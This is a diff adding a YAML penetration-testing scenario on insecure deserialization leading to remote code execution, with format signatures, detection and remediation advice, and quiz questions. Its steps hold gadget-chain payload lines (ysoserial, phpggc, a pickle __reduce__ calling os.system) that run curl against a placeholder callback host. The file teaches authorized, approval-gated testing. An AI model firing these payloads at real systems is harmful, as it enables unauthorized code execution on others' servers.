@@ -1,0 +1,114 @@
+# Category: Insecure Deserialization
+# Source: re-implemented (2026-11-25 harvest round) from the general insecure-
+# deserialization methodology in Claude-BugHunter (github.com/elementalsouls/
+# Claude-BugHunter) hunt-deserialization skill, content licensed CC BY 4.0
+# International; adapted into this framework's own scenario schema, not copied
+# verbatim. See work.md. This is reference methodology for an AUTHORIZED
+# engagement's confirming probe, not a standing instruction to run a gadget
+# chain against any target without explicit scope authorization and the
+# framework's own HIGH-RISK approval gate.
+name: "Insecure deserialization leading to remote code execution"
+id: "deserialization-gadget-chain-001"
+category: "deserialization"
+subcategory: "gadget_chain_rce"
+difficulty: "expert"
+estimated_time: "60 minutes"
+
+description: |
+  When a server deserializes attacker-controlled data (Java serialized
+  objects, PHP serialized strings, Python pickle, .NET BinaryFormatter, Ruby
+  Marshal) without restricting which classes/gadgets can be instantiated, an
+  attacker can craft a payload whose deserialization side effects (magic
+  methods like __wakeup/__destruct/__reduce__) chain into arbitrary code
+  execution. This class of bug is almost always Critical because it leads
+  directly to RCE with no further prerequisite -- but it must be CONFIRMED
+  via an out-of-band callback or an observable command effect, never
+  asserted from the mere presence of a serialized-looking blob.
+
+learning_objectives:
+  - Recognize the binary/text signatures of each serialization format (Java, PHP, pickle, .NET ViewState, Ruby Marshal)
+  - Understand why an out-of-band (OOB) callback is the safest way to confirm RCE without a destructive payload
+  - Use an existing gadget-chain tool (ysoserial, phpggc) rather than hand-crafting a chain
+  - Distinguish a confirmed callback/command-effect from a mere "the server accepted the payload" observation
+
+tools:
+  - ysoserial (Java gadget chains)
+  - phpggc (PHP gadget chains)
+  - An out-of-band collaborator/callback service the tester controls
+  - curl
+
+prerequisites:
+  - A target endpoint that accepts and deserializes attacker-supplied data (a cookie, a specific content-type, a known vulnerable framework version)
+  - Explicit authorization for an active, state-changing probe (this technique executes code on the target if successful)
+  - The framework's self-scripting / HIGH-RISK approval gate -- this probe must go through live human approval, never be auto-fired
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the serialization format in use and a candidate injection point"
+    commands:
+      - "# Java serialized objects: base64 starting with rO0A, or raw bytes AC ED 00 05"
+      - "# PHP serialized data: O:<len>:\"ClassName\":<n>:{...}"
+      - "# Python pickle: bytes starting with \\x80\\x04 or \\x80\\x02"
+      - "# Look for Content-Type: application/x-java-serialized-object, or cookies with an rO0= / rememberMe= prefix"
+    expected_output: "Confirmation of the serialization format and the exact field/cookie/body carrying it"
+    detection: "None -- this only inspects traffic already observed"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Generate an OUT-OF-BAND detection payload first (never a destructive one on the first attempt)"
+    commands:
+      - "# Java example: ysoserial CommonsCollections6 'curl http://<collaborator>/marker'"
+      - "# PHP example: phpggc <chain> system 'curl http://<collaborator>/marker'"
+      - "# Python pickle example: a __reduce__ returning (os.system, ('curl http://<collaborator>/marker',))"
+      - "# Send the generated payload to the identified injection point (body, cookie, or header)"
+    expected_output: "A callback hit at the collaborator service, proving the gadget chain executed on the target"
+    detection: "An outbound DNS/HTTP request from the target's infrastructure to the collaborator service, correlated with the timing of the probe"
+
+  - id: "step3"
+    phase: "validation"
+    action: "Confirm the callback is genuinely attributable to this probe, not coincidental"
+    commands:
+      - "# Use a unique, single-use subdomain/path per attempt so the callback can only be attributed to this exact probe"
+      - "# Re-send the SAME payload once more to confirm reproducibility, and a control (same request, no gadget payload) to confirm no callback fires without it"
+    expected_output: "A reproducible callback that fires only when the gadget-chain payload is present, never on the control"
+    detection: "None beyond step 2 -- this is the confirming analysis"
+
+compliance_controls:
+  - standard: "OWASP"
+    control: "A08:2021"
+    description: "Software and Data Integrity Failures"
+  - standard: "MITRE ATT&CK"
+    control: "T1059"
+    description: "Command and Scripting Interpreter"
+
+detection:
+  network_indicators:
+    - "Serialized-object content types or byte signatures in request bodies/cookies from unexpected sources"
+  log_indicators:
+    - "Outbound connections from the application server to an unfamiliar external host immediately following a request containing serialized data"
+  endpoint_indicators:
+    - "Unexpected child processes spawned by the application server process"
+
+remediation:
+  immediate:
+    - "Never deserialize attacker-controlled data with a format that permits arbitrary class instantiation"
+    - "If deserialization of external data is unavoidable, use a strict allowlist of permitted classes/types"
+  long_term:
+    - "Migrate to data formats with no executable side effects (JSON with a fixed schema) wherever possible"
+    - "Patch/upgrade frameworks with known public gadget chains (Commons Collections, Spring, Rails) promptly"
+
+variables:
+  target_url: "https://target.example/api/load-state"
+  collaborator_host: "<tester-controlled-oob-collaborator>"
+
+assessment_questions:
+  - "Why is an out-of-band callback a safer confirmation method than a destructive payload?"
+  - "Why must the collaborator path be unique per attempt?"
+  - "Why does this probe require explicit human approval before execution, unlike a passive recon action?"
+
+references:
+  - url: "https://portswigger.net/web-security/deserialization"
+    title: "PortSwigger Insecure Deserialization"
+  - url: "https://owasp.org/www-project-top-10/2021/A08_2021-Software_and_Data_Integrity_Failures"
+    title: "OWASP Software and Data Integrity Failures"
